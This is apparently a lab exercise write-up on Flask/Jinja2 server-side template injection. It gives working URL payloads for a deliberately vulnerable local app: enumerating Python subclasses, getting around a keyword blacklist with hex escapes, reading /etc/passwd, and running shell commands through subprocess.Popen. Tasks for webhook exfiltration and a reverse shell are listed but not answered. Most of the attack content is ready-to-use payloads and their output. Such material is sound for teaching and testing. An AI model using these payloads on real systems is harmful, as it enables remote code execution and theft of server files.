Q: Give unique ssti payloads for the given cases while following these conditions:

```
from flask import Flask, request, render_template_string

app = Flask(__name__)


@app.route("/")
def home():
    if request.args.get("c"):
        return render_template_string(request.args.get("c"))
    else:
        return "Hello, send someting inside the param 'c'!"


if __name__ == "__main__":
    app.run()
```

- Return the index of urllib in subclasses()
  
```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here

```http://127.0.0.1:5000/?c={{().__class__.__base__}}``` : ```<class 'object'>```

```http://127.0.0.1:5000/?c={{().__class__.__base__.__subclasses__()}}``` : ```[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>``` : returns all the subclasses for that object<br>

Now to get the index at which the urllib is present, we can copy the list and iterate through it or to directly run it in the browser we can use a for loop:
```
{% set subclasses = ().__class__.__base__.__subclasses__() %}
{% for i in range(subclasses|length) %}
  {% if 'urllib' in subclasses[i].__module__ %}
    {{ i }}
  {% endif %}
{% endfor %}
```
If this is our payload, then the for loop iterates through the subclasses list and prints the index wherever it finds urllib mentioned
url encoding the block we get the payload as: 
PAYLOAD:
```
%7B%25%20set%20subclasses%20%3D%20().__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20for%20i%20in%20range(subclasses%7Clength)%20%25%7D%0A%20%20%7B%25%20if%20'urllib'%20in%20subclasses%5Bi%5D.__module__%20%25%7D%0A%20%20%20%20%7B%7B%20i%20%7D%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D
```

![image](https://github.com/poorvi1910/Web/assets/146640913/433ab890-0a54-4476-a97c-725822933382)

FOR BLACKLIST: 
```
http://127.0.0.1:5000/?c={{%20(dict.mro()[-1]|attr(%22\x5f\x5fsubclasses\x5f\x5f%22))()%20}}
```

- Get name of current python flask script


- Get all the current envvars


- Read a local file

```http://127.0.0.1:5000/?c={{%20request.__class__}}``` : ```<class 'flask.wrappers.Request'>```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data}}``` : ```<function Request._load_form_data at 0x7facac724680>```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__}}``` : ```{'__name__': 'flask.wrappers', '__doc__': None, '__package__': 'flask', '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7facac720f90>...```

```http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__}}``` : ```{'__name__': 'builtins', '__doc__': "Built-in functions, types, exceptions, and other objects.\n\nThis module provides direct access to all 'built-in'\nidentifiers of Python...```

PAYLOAD:
```
http://127.0.0.1:5000/?c={{%20request.__class__._load_form_data.__globals__.__builtins__.open(%22/etc/passwd%22).read()%20}}
```
![image](https://github.com/poorvi1910/Web/assets/146640913/dba77ed3-b558-41bc-8740-12d3d668d256)


- Run a command

```http://127.0.0.1:5000/?c={{().__class__}}``` : ```<class 'tuple'>``` : class method returns the class of the object that is an empty tuple over here

```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568]}}``` : ```<class 'subprocess.Popen'>``` : selecting the popen subprocess

```http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}``` :  running cat command on a python file to read it

![image](https://github.com/poorvi1910/Web/assets/146640913/a516db8b-213f-4e58-8650-585cac3a95de)

PAYLOAD:
```
http://127.0.0.1:5000/?c={{().__class__.__mro__[1].__subclasses__()[568](%27cat%20try.py%27,%20shell=True,%20stdout=-1).communicate()}}
```

- Send the contents of etc pass to  awebhook


- Create a reverse shell, save your work and run the command yes on the rev shell


- Re-write everything above to work against this blacklist = [    "import",    "open",    "module",    "write",    "load",    "read",    "eval",    "exec",    "system",    "os",    "_",    #",    ',    "]
